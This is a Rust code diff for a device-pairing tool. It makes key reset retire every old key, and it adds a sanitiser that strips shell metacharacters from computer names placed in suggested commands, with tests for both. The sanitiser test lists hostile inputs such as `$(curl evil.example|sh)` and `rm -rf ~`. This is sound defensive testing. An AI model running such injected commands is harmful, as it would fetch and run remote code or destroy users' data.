@@ -335,13 +335,57 @@ fn tidy(
     Ok(None)
 }
 
-/// `pigeon-agent reset`: a new device key for this computer (both roles).
-/// The old one is replaced in the store; returns the new key.
-pub fn reset(dir: &Path, store: &dyn SecretStore) -> Result<SecretKey> {
+/// What [`reset`] did.
+#[derive(Debug)]
+pub struct Reset {
+    /// The new device key.
+    pub key: SecretKey,
+    /// Every key this computer had before (device key, old per-role keys),
+    /// all retired now: the other side should revoke each of them.
+    pub retired: Vec<EndpointId>,
+    /// Every remembered agent: all knew one of the retired keys, so each
+    /// must be paired again.
+    pub agents: Vec<PairedAgent>,
+}
+
+/// `pigeon-agent reset` (W-12): a new device key for this computer, for
+/// both roles. Every old key is retired, not just the device key: the old
+/// per-role `agent-key` / `client-key` entries are deleted too, the
+/// migration state in `device.json` is cleared, and the `legacy_key` marks
+/// in `agents.json` are removed, so nothing keeps dialling with an old key.
+/// The caller asked for exactly this (`--yes`) and is told which keys were
+/// retired and which agents need a new pairing.
+pub fn reset(dir: &Path, store: &dyn SecretStore) -> Result<Reset> {
     let _lock = create_lock(dir)?;
+    let mut retired = Vec::new();
+    for name in [DEVICE_KEY, LEGACY_AGENT_KEY, LEGACY_CLIENT_KEY] {
+        // A damaged entry is replaced or deleted anyway: that is what reset is for.
+        if let Ok(Some(old)) = keystore::read_key(store, name)
+            && !retired.contains(&old.public())
+        {
+            retired.push(old.public());
+        }
+    }
     let key = SecretKey::generate();
     keystore::write_key(store, DEVICE_KEY, &key)?;
-    Ok(key)
+    // Only once the new key is stored and read back.
+    store.delete(LEGACY_AGENT_KEY)?;
+    store.delete(LEGACY_CLIENT_KEY)?;
+    update_device_file(dir, |f| {
+        f.legacy_client = None;
+        f.cleanup.clear();
+    })?;
+    let agents = AgentList::update(&dir.join(AGENTS_FILE), |list| {
+        for a in &mut list.agents {
+            a.legacy_key = None;
+        }
+        Ok(list.agents.clone())
+    })?;
+    Ok(Reset {
+        key,
+        retired,
+        agents,
+    })
 }
 
 /// Renames this computer (both programs show the new name).
@@ -363,6 +407,25 @@ pub fn clean_name(raw: &str) -> Option<String> {
         .take(MAX_NAME)
         .collect();
     let kept = kept.trim();
+    (!kept.is_empty()).then(|| kept.to_string())
+}
+
+/// The name as it may appear inside double quotes in a command we suggest
+/// typing or pasting on *another* computer (W-14): `pigeon-agent pair`
+/// prints `pigeon pair <LINK> --name "<this>"`. The name can come from the
+/// OS (on a managed work Mac employer IT sets it), so anything a shell could
+/// act on inside double quotes (`$`, backticks, `"`, `\`, `!`, `%`, the
+/// curly double quotes PowerShell also accepts, ...) is dropped: only
+/// letters, digits, spaces and `. _ - '` and `’` are kept, and no leading
+/// `-` (it would look like an option). `None` if nothing is left; then the
+/// hint has no `--name`.
+pub fn hint_name(name: &str) -> Option<String> {
+    let kept: String = name
+        .chars()
+        .filter(|c| c.is_alphanumeric() || " ._-'’".contains(*c))
+        .collect();
+    let kept = kept.split_whitespace().collect::<Vec<_>>().join(" ");
+    let kept = kept.trim_start_matches(['-', ' ']);
     (!kept.is_empty()).then(|| kept.to_string())
 }
 
@@ -667,10 +730,92 @@ mod tests {
         let store = MemoryStore::default();
         let before = load(dir.path(), &store).unwrap();
         let new = reset(dir.path(), &store).unwrap();
-        assert_ne!(new.public(), before.id());
+        assert_ne!(new.key.public(), before.id());
+        assert_eq!(new.retired, vec![before.id()]);
+        assert!(new.agents.is_empty());
         let after = load(dir.path(), &store).unwrap();
-        assert_eq!(after.id(), new.public());
+        assert_eq!(after.id(), new.key.public());
         assert_eq!(after.name, before.name, "the name stays");
+    }
+
+    /// W-12: on a migrated two-key install, reset retires *every* old key
+    /// (the device key and the old client key), clears the migration state
+    /// and every `legacy_key` mark, and reports all remembered agents. An
+    /// interrupted-migration leftover (`agent-key` in `cleanup`) goes too.
+    #[test]
+    fn reset_retires_the_old_client_key_and_all_marks() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = MemoryStore::default();
+        let agent_key = SecretKey::generate();
+        let client_key = SecretKey::generate();
+        write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
+        write_key(&store, LEGACY_CLIENT_KEY, &client_key).unwrap();
+        let office = remember_agent(dir.path(), 1);
+        let me = load(dir.path(), &store).unwrap();
+        assert_eq!(me.legacy_client, Some(client_key.public()));
+        let new_agent = remember_agent(dir.path(), 2);
+        // A leftover copy of the old device key from a crash mid-migration.
+        write_key(&store, LEGACY_AGENT_KEY, &agent_key).unwrap();
+        update_device_file(dir.path(), |f| f.cleanup = vec![LEGACY_AGENT_KEY.into()]).unwrap();
+
+        let done = reset(dir.path(), &store).unwrap();
+        assert_eq!(done.retired, vec![agent_key.public(), client_key.public()]);
+        let names: Vec<_> = done.agents.iter().map(|a| a.name.clone()).collect();
+        assert_eq!(names, [office.name.clone(), new_agent.name.clone()]);
+        assert!(read_key(&store, LEGACY_AGENT_KEY).unwrap().is_none());
+        assert!(read_key(&store, LEGACY_CLIENT_KEY).unwrap().is_none());
+        let file = read_device_file(dir.path()).unwrap();
+        assert!(file.legacy_client.is_none() && file.cleanup.is_empty());
+        assert!(
+            agents(dir.path())
+                .agents
+                .iter()
+                .all(|a| a.legacy_key.is_none())
+        );
+
+        // Nothing dials with an old key any more, and nothing is "kept".
+        let after = load(dir.path(), &store).unwrap();
+        assert_eq!(after.id(), done.key.public());
+        assert!(after.legacy_client.is_none());
+        assert!(after.notes.is_empty(), "{:?}", after.notes);
+        for a in &agents(dir.path()).agents {
+            assert_eq!(after.key_for(&store, a).unwrap().public(), after.id());
+        }
+    }
+
+    /// W-14: hostile computer names never reach a suggested command line
+    /// as something a shell (bash, zsh, PowerShell, cmd) would run.
+    #[test]
+    fn hint_names_are_shell_inert() {
+        for (hostile, want) in [
+            ("$(curl evil.example|sh)", Some("curl evil.examplesh")),
+            ("`rm -rf ~`", Some("rm -rf")),
+            ("a\"; calc; \"b", Some("a calc b")),
+            ("x\\\" $env:USERPROFILE", Some("x envUSERPROFILE")),
+            ("%PATH% !! ${IFS}", Some("PATH IFS")),
+            ("“smart” quotes", Some("smart quotes")),
+            ("--help", Some("help")),
+            ("$()`\"", None),
+        ] {
+            let got = hint_name(hostile);
+            assert_eq!(got.as_deref(), want, "{hostile:?}");
+            if let Some(s) = got {
+                assert!(
+                    s.chars()
+                        .all(|c| c.is_alphanumeric() || " ._-'’".contains(c)),
+                    "{s:?}"
+                );
+            }
+        }
+        for normal in [
+            "Office Mac",
+            "Ali’s MacBook Pro",
+            "DESKTOP-7Q2K",
+            "Отчёт ПК",
+            "o'brien.local",
+        ] {
+            assert_eq!(hint_name(normal).as_deref(), Some(normal));
+        }
     }
 
     #[test]
